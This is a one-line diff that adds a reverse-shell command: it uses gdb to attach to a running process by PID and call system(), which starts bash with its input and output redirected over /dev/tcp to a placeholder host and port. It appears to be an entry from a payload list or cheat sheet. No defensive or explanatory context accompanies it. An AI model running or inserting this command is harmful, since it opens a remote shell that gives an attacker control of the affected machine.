@@ -1,0 +1,1 @@
+gdb --batch -p *\pid* -ex 'call system("bash -c '\''*\shell* &> /dev/tcp/*\host*/*\port* 0>&1'\''")'
